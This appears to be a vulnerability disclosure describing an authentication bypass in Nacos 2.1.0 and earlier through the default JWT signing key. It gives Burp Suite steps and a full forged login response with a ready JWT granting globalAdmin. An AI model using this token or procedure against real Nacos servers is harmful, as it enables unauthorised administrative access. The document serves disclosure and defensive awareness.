#### Vuln Impact 

An issue has been discovered in Nacos affecting Nacos <= 2.1.0.Nacos users use the default JWT key to cause an unauthorized access vulnerability. Through this vulnerability, attackers can bypass user name and password authentication and directly log in to the Nacos user

#### Vuln Product

Nacos <= 2.1.0 version

#### Vulnerability reappearance

Step 1：Go directly to Nacos website, fill in any user name and password and use Burpsuite to grab the bag.

![login](img\login.png)

Step 2：Intercept the response packet.

![response](img\response.png)

Step 3: Modify the data packet as follows

```javascript
HTTP/1.1 200
Date: Thu, 10 Nov 2022 01:27:16 GMT
Content-Type: application/json
Content-Length: 13
Connection: close
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Security-Policy: script-src 'self'
Server: elb

{"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA","tokenTtl":18000,"globalAdmin":true}
```

![new](img\new.png)

Step 4: Log in successfully after releasing the data packet.

![success](img\success.png)



